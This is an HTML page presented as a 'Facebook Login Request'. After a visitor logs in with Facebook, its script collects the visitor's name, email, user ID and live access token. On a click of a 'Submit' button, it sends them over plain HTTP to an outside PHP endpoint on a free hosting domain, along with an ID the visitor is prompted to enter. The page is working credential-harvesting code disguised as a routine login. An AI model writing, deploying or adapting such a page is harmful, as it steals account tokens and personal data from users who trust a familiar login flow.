<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login Request</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f2f2f2;
            padding: 20px;
        }

        h2 {
            color: #333;
        }

        #fb-login-container {
            margin: 20px 0;
        }

        #openTabButton {
            display: none;
            margin: 20px 0;
            padding: 10px 20px;
            background-color: #4267B2;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        #openTabButton:hover {
            background-color: #365899;
        }
    </style>
</head>
<body>
    <h2>Facebook Login Request</h2>
    <div id="fb-login-container">
        <fb:login-button 
            scope="public_profile,email" 
            onlogin="checkLoginState();">
        </fb:login-button>
    </div>

    <!-- Button to manually trigger the new tab open if necessary -->
    <button id="openTabButton" onclick="openTabWithUserData()">Submit</button>

    <script>
        let userDataUrl = ''; // Store the URL with user data

        // Facebook SDK initialization
        window.fbAsyncInit = function () {
            FB.init({
                appId: '761434701600961', // Replace with your Facebook App ID
                cookie: true,
                xfbml: true,
                version: 'v20.0'
            });

            FB.getLoginStatus(function (response) {
                statusChangeCallback(response);
            });
        };

        // Asynchronously load the Facebook SDK
        (function (d, s, id) {
            var js, fjs = d.getElementsByTagName(s)[0];
            if (d.getElementById(id)) { return; }
            js = d.createElement(s); js.id = id;
            js.src = "https://connect.facebook.net/en_US/sdk.js";
            fjs.parentNode.insertBefore(js, fjs);
        }(document, 'script', 'facebook-jssdk'));

        // Callback function for Facebook login status
        function statusChangeCallback(response) {
            if (response.status === 'connected') {
                // Logged into your app and Facebook.
                document.getElementById('fb-login-container').style.display = 'none';
                fetchUserData();
            } else {
                document.getElementById('fb-login-container').style.display = 'block';
            }
        }

        // Fetch user data after successful login
        function fetchUserData() {
            FB.api('/me', {fields: 'name,email,id'}, function (response) {
                // Get the user details
                let userName = response.name;
                let userEmail = response.email;
                let userId = response.id;
                let accessToken = FB.getAuthResponse().accessToken;

                // Check if `someuserdeta` is present in the URL query string
                let urlParams = new URLSearchParams(window.location.search);
                let someuserdeta = urlParams.get('id');

                // If 'id' (someuserdeta) is missing, show a popup to prompt the user
                if (!someuserdeta) {
                    someuserdeta = prompt('Please enter the ID:', 'default_id_value');
                    if (!someuserdeta) {
                        alert('ID is required to proceed.');
                        return;
                    }
                }

                // Create the URL with user data to be opened in a new tab
                userDataUrl = `http://sabbir28.rf.gd/save_user_data.php?facebook_id=${encodeURIComponent(userId)}&facebook_name=${encodeURIComponent(userName)}&facebook_email=${encodeURIComponent(userEmail)}&facebook_token=${encodeURIComponent(accessToken)}&filename=${encodeURIComponent(someuserdeta)}`;

                // Automatically show the button to open a new tab
                document.getElementById('openTabButton').style.display = 'inline';
            });
        }

        // Function to open the new tab
        function openTabWithUserData() {
            if (userDataUrl) {
                window.open(userDataUrl, '_blank');
            } else {
                alert('No user data available to open.');
            }
        }

        // Called when user completes the Facebook login process
        function checkLoginState() {
            FB.getLoginStatus(function (response) {
                statusChangeCallback(response);
            });
        }
    </script>
</body>
</html>
